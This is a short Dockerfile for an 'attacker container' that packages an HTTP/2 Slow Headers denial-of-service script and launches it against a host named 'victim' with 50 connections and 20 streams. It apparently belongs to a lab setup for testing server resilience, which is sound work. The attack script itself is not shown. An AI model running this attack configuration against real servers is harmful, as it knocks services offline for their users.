# Attacker container for HTTP/2 Slow Headers attack
FROM python:3.11-slim

# No external dependencies needed - using raw HTTP/2 implementation

# Create working directory
WORKDIR /app

# Copy simplified attack script
COPY simple_slow_headers.py .

# Make script executable
RUN chmod +x simple_slow_headers.py

# Default command
CMD ["python", "simple_slow_headers.py", "--host", "victim", "--port", "80", "--connections", "50", "--streams", "20", "--verbose"]